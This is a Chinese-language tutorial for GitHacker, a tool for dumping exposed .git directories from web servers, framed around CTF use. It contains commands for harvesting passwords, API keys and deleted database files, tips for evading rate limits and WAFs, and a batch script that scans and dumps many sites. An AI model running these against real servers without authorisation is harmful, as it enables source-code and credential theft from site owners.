# GitHacker 使用手册（Git泄露利用工具）

> GitHacker 是最流行的 .git 目录泄露利用工具，能够自动下载并恢复完整源代码。

---

## 目录
1. [概述](#概述)
2. [安装方法](#安装方法)
3. [基本使用](#基本使用)
4. [高级功能](#高级功能)
5. [CTF应用场景](#ctf应用场景)
6. [实战案例](#实战案例)
7. [常见问题](#常见问题)
8. [参考资源](#参考资源)

---

## 概述

### 工具特点

GitHacker 是由 WangYihang 开发的专业 Git 泄露利用工具，具有:
- ✅ **自动化程度高**: 一键下载完整源码
- ✅ **多线程支持**: 快速并发下载
- ✅ **智能索引解析**: 自动解析 .git/index 文件
- ✅ **对象重建**: 完整恢复 Git 对象
- ✅ **Python 实现**: 跨平台支持
- ✅ **主动维护**: 定期更新

### 工作原理

```
1. 下载 .git/config, HEAD, index 等关键文件
2. 解析 index 获取所有文件的对象哈希
3. 下载所有 objects 文件
4. 重建工作目录
5. 恢复完整源码
```

### 系统要求

- Python 3.6+
- Git 客户端
- 网络连接

---

## 安装方法

### 方法1: PyPI 安装（推荐）

```bash
# 使用 pip 安装
pip3 install GitHacker

# 验证安装
githacker --help

# 升级到最新版本
pip3 install --upgrade GitHacker
```

### 方法2: 源码安装

```bash
# 克隆仓库
git clone https://github.com/WangYihang/GitHacker.git
cd GitHacker

# 安装依赖
pip3 install -r requirements.txt

# 运行
python3 GitHacker.py --help

# 可选：安装到系统
python3 setup.py install
```

### 方法3: Docker 安装

```bash
# 拉取镜像
docker pull wangyihang/githacker

# 运行
docker run -it --rm -v $(pwd):/output wangyihang/githacker \
    --url http://example.com/.git/ \
    --output-folder /output/result
```

### 依赖库

```
requests>=2.25.0
beautifulsoup4>=4.9.3
colorama>=0.4.4
gitpython>=3.1.14
```

---

## 基本使用

### 最简单的用法

```bash
# 基本命令
githacker --url http://example.com/.git/ --output-folder result

# 简写形式
githacker -u http://example.com/.git/ -o result
```

### 常用参数

```bash
githacker \
    --url http://example.com/.git/ \     # 目标 URL
    --output-folder result \              # 输出目录
    --threads 10 \                        # 线程数（默认10）
    --brute                               # 暴力枚举模式
```

### 完整参数说明

```
必需参数:
  -u, --url URL              目标 .git 目录的 URL
  -o, --output-folder DIR    输出目录

可选参数:
  -t, --threads N            并发线程数（默认:10）
  -b, --brute                启用暴力枚举模式
  -a, --all                  下载所有分支
  --depth N                  克隆深度限制
  -v, --verbose              详细输出
  -h, --help                 显示帮助信息
```

---

## 高级功能

### 1. 多线程下载

```bash
# 默认10个线程
githacker -u http://example.com/.git/ -o result

# 增加到50个线程（更快，但可能触发防护）
githacker -u http://example.com/.git/ -o result -t 50

# 减少到1个线程（更隐蔽）
githacker -u http://example.com/.git/ -o result -t 1
```

### 2. 暴力枚举模式

当服务器禁止目录列表但对象文件仍可访问时使用:

```bash
# 启用暴力枚举
githacker -u http://example.com/.git/ -o result --brute

# 原理：枚举常见的对象哈希
# .git/objects/00/0000...
# .git/objects/01/0101...
# ...
# .git/objects/ff/ffff...
```

### 3. 下载所有分支

```bash
# 下载所有分支（默认只下载当前分支）
githacker -u http://example.com/.git/ -o result --all

# 查看所有分支
cd result
git branch -a
```

### 4. 限制克隆深度

```bash
# 只下载最近10次提交
githacker -u http://example.com/.git/ -o result --depth 10

# 浅克隆（速度快，但历史不完整）
githacker -u http://example.com/.git/ -o result --depth 1
```

### 5. 详细输出模式

```bash
# 显示详细的下载过程
githacker -u http://example.com/.git/ -o result --verbose

# 输出包括：
# - 每个文件的下载状态
# - 对象哈希值
# - HTTP 响应码
# - 错误信息
```

---

## CTF应用场景

### 场景1: 标准 .git 泄露

```bash
# 题目提示访问：http://challenge.com/

# 1. 检测 .git 目录
curl http://challenge.com/.git/config

# 2. 使用 GitHacker 下载
githacker -u http://challenge.com/.git/ -o source

# 3. 查看源码
cd source
ls -la

# 4. 查找 flag
grep -r "flag{" .
grep -r "FLAG{" .

# 5. 查看敏感文件
cat config.php
cat .env
```

### 场景2: 历史记录中的 Flag

```bash
# 下载源码
githacker -u http://challenge.com/.git/ -o source --all

cd source

# 查看所有提交
git log --all --oneline

# 查找包含 "flag" 的提交
git log --all -S "flag" --source

# 查看特定提交
git show <commit_hash>

# 恢复删除的文件
git log --diff-filter=D --summary
git checkout <commit_hash> -- deleted_file.txt
```

### 场景3: 配置文件泄露

```bash
# 下载源码
githacker -u http://challenge.com/.git/ -o source

cd source

# 查找配置文件
find . -name "config*"
find . -name ".env*"
find . -name "*.ini"
find . -name "*.yaml"

# 查看数据库配置
cat config/database.yml
cat .env

# 提取凭据
grep -r "password" config/
grep -r "api_key" .
```

### 场景4: 开发者信息收集

```bash
cd source

# 查看开发者信息
git log --format="%an <%ae>" | sort -u

# 查看提交统计
git log --all --pretty=format:"%an" | sort | uniq -c | sort -nr

# 查看某个开发者的所有提交
git log --author="username" --all --oneline
```

### 场景5: Stash 和 Reflog

```bash
cd source

# 查看 stash
git stash list

# 查看 stash 内容
git stash show -p stash@{0}

# 应用 stash
git stash apply stash@{0}

# 查看 reflog（包括已删除的提交）
git reflog

# 恢复已删除的提交
git checkout <commit_hash>
```

---

## 实战案例

### 案例1: 简单的源码泄露

**场景**: Web 应用部署时未删除 .git 目录

```bash
# 1. 发现泄露
curl http://target.com/.git/HEAD
# 输出: ref: refs/heads/master

# 2. 下载源码
githacker -u http://target.com/.git/ -o webapp

# 3. 分析源码
cd webapp
tree -L 2

# 4. 查找漏洞
grep -r "eval(" .
grep -r "exec(" .
grep -r "system(" .

# 5. 发现 flag
cat flag.txt
# 或在数据库配置中
cat config.php
```

### 案例2: 硬编码密钥

**场景**: 开发者在代码中硬编码了 API 密钥

```bash
# 下载源码
githacker -u http://target.com/.git/ -o app

cd app

# 搜索 API 密钥模式
git log --all -S "api_key" --source
git log --all -S "secret_key" --source

# 查看包含密钥的提交
git show abc123

# 或使用工具自动扫描
gitleaks detect --source .
trufflehog filesystem .
```

### 案例3: 已删除的敏感文件

**场景**: 开发者提交了敏感文件后又删除，但历史中仍存在

```bash
# 下载完整历史
githacker -u http://target.com/.git/ -o source --all

cd source

# 查找所有被删除的文件
git log --diff-filter=D --summary | grep delete

# 示例输出:
# delete mode 100644 database_backup.sql
# delete mode 100644 secret_keys.txt

# 找到删除操作的提交
git log --all --full-history -- database_backup.sql

# 恢复文件
git checkout abc123^ -- database_backup.sql

# 查看内容
cat database_backup.sql
```

### 案例4: 多分支场景

**场景**: 不同分支包含不同的敏感信息

```bash
# 下载所有分支
githacker -u http://target.com/.git/ -o project --all

cd project

# 列出所有分支
git branch -a

# 切换到不同分支查找
git checkout develop
grep -r "flag{" .

git checkout feature/admin
grep -r "password" .

git checkout hotfix/security
git log --oneline
```

### 案例5: Packed Objects

**场景**: Git 打包了对象文件以节省空间

```bash
# GitHacker 会自动处理 pack 文件

githacker -u http://target.com/.git/ -o repo

cd repo

# 验证 pack 文件
ls -lh .git/objects/pack/

# 列出 pack 中的所有对象
git verify-pack -v .git/objects/pack/*.idx

# 提取特定对象
git cat-file -p <object_hash>
```

---

## 常见问题

### 问题1: 下载失败或不完整

**症状**: 部分文件无法下载

**解决方案**:
```bash
# 1. 增加线程数重试
githacker -u http://target.com/.git/ -o result -t 20

# 2. 尝试暴力枚举模式
githacker -u http://target.com/.git/ -o result --brute

# 3. 手动下载缺失的关键文件
wget http://target.com/.git/index -O result/.git/index
wget http://target.com/.git/HEAD -O result/.git/HEAD
```

### 问题2: 服务器限速或封禁

**症状**: HTTP 429 或连接被拒绝

**解决方案**:
```bash
# 1. 减少线程数
githacker -u http://target.com/.git/ -o result -t 1

# 2. 添加延迟（修改源码）
# 在请求之间添加 time.sleep(0.5)

# 3. 使用代理
export HTTP_PROXY=http://proxy:8080
export HTTPS_PROXY=http://proxy:8080
githacker -u http://target.com/.git/ -o result
```

### 问题3: WAF 防护

**症状**: 请求被 WAF 拦截

**解决方案**:
```bash
# 1. 修改 User-Agent
# 编辑 GitHacker 源码，更改请求头

# 2. 使用不同的路径变体
http://target.com/.git/
http://target.com/.git../
http://target.com/test/../.git/

# 3. 编码绕过
http://target.com/%2e%67%69%74/  # URL 编码
```

### 问题4: 对象文件压缩

**症状**: 下载的对象文件无法解析

**解决方案**:
```bash
# GitHacker 自动处理 zlib 压缩
# 如果失败，手动解压：

python3 << 'EOF'
import zlib

with open('.git/objects/ab/cdef123...', 'rb') as f:
    content = f.read()

try:
    decompressed = zlib.decompress(content)
    print(decompressed.decode('utf-8', errors='ignore'))
except:
    print("解压失败")
EOF
```

### 问题5: 权限错误

**症状**: 文件权限不正确

**解决方案**:
```bash
# 修复权限
cd result
chmod -R u+rw .git
git reset --hard HEAD
```

---

## 性能优化

### 1. 合理的线程数

```bash
# 小型仓库 (< 100 文件)
githacker -u URL -o result -t 5

# 中型仓库 (100-1000 文件)
githacker -u URL -o result -t 10  # 默认

# 大型仓库 (> 1000 文件)
githacker -u URL -o result -t 20
```

### 2. 网络优化

```bash
# 使用本地代理加速
export HTTP_PROXY=http://127.0.0.1:8080

# 设置超时
# 修改源码中的 timeout 参数
```

### 3. 存储优化

```bash
# 浅克隆节省空间
githacker -u URL -o result --depth 1

# 只下载当前分支
githacker -u URL -o result  # 不使用 --all
```

---

## 与其他工具对比

| 特性 | GitHacker | git-dumper | GitTools |
|------|-----------|------------|----------|
| 安装简单 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| 自动化程度 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| 多线程 | ✅ | ✅ | ❌ |
| 暴力枚举 | ✅ | ❌ | ❌ |
| 错误处理 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| 活跃维护 | ✅ | ✅ | ⚠️ |
| Python 3 | ✅ | ✅ | ❌ |

---

## 进阶技巧

### 1. 批量扫描

```bash
#!/bin/bash
# 批量利用脚本

targets=(
    "http://site1.com"
    "http://site2.com"
    "http://site3.com"
)

for target in "${targets[@]}"; do
    echo "[*] 处理: $target"

    # 检测
    if curl -s "$target/.git/config" | grep -q "repositoryformatversion"; then
        echo "[+] 发现 .git 泄露: $target"

        # 下载
        output_dir="dumps/$(echo $target | sed 's/[^a-zA-Z0-9]/_/g')"
        githacker -u "$target/.git/" -o "$output_dir" -t 10

        echo "[+] 完成: $output_dir"
    else
        echo "[-] 未发现泄露: $target"
    fi
done
```

### 2. 自动化分析

```bash
# 下载并自动分析
githacker -u http://target.com/.git/ -o source

cd source

# 自动查找敏感信息
echo "=== 查找 Flag ==="
grep -r "flag{" . 2>/dev/null

echo -e "\n=== 查找密码 ==="
grep -r "password" . 2>/dev/null | grep -v ".git"

echo -e "\n=== 查找 API Key ==="
grep -r "api_key\|apikey\|api-key" . 2>/dev/null

echo -e "\n=== 数据库配置 ==="
find . -name "*.env" -o -name "config*.php" -o -name "database.yml"

# 使用 gitleaks 扫描
gitleaks detect --source . --report-format json --report-path report.json
```

---

## 参考资源

### 官方资源
- **GitHub**: https://github.com/WangYihang/GitHacker
- **PyPI**: https://pypi.org/project/GitHacker/
- **文档**: 仓库 README

### 相关工具
- **git-dumper**: https://github.com/arthaud/git-dumper
- **GitTools**: https://github.com/internetwache/GitTools
- **gitleaks**: https://github.com/zricethezav/gitleaks

### 学习资源
- **CTF Wiki**: https://ctf-wiki.org/misc/other/git/
- **.git 泄露原理**: https://book.hacktricks.xyz/
- **Git 内部原理**: https://git-scm.com/book/zh/v2/Git-内部原理

---

**文档版本**: v1.0
**更新日期**: 2025-01
**适用版本**: GitHacker v1.1.0+
